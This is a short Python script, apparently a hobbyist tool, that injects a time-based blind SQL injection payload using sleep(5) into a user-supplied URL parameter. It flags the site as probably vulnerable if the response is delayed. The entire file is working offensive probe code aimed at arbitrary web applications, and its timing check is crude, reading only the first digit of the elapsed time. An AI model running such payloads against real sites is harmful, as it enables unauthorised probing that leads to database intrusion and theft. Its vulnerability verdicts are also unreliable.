#!/bin/python3

from art import *


def help():
	tprint("\nSQLI","slant")
	print("\n[-] Example: python3 sqli.py -u http://192.168.1.102/contact.php?id= \n")

def main():
	import requests, sys, random, string, os

	if len(sys.argv) != 3 and sys.argv[1] != "-h" :
		help()


	elif sys.argv[1] != "-u":
		help()


	elif len(sys.argv) == 3 and sys.argv[1] == "-u":
		try:
			os.system("clear")
			print(f"\033[92m[*] Trying Sqli on {sys.argv[2]}\n")

			# Send trash
			letters = string.ascii_lowercase
			random = ''.join(random.choice(letters) for i in range(5))

			# Time based Payload
			payload = f"' and (select * from (select(sleep(5))){random}) and '1'='1#"
			print(f"\033[92m[*] Payload used: {payload}\n")

			# Doing request
			result = requests.get(sys.argv[2] + payload)

			time = result.elapsed.total_seconds()
			if str(time)[0] == "5":
				print("\033[91m[*] Probably vulnerable to SQLI\033[m\n")
			else:
				print("\033[92m[-] May not vulnerable\n")
		except Exception as error:
			print(f"\033[94m[-] Verify if url value is correct\n\n \033[91m{error}\n")


try:
	main()
except Exception as error:
	help()
	print("[-] Probably you didn't pass all arguments")





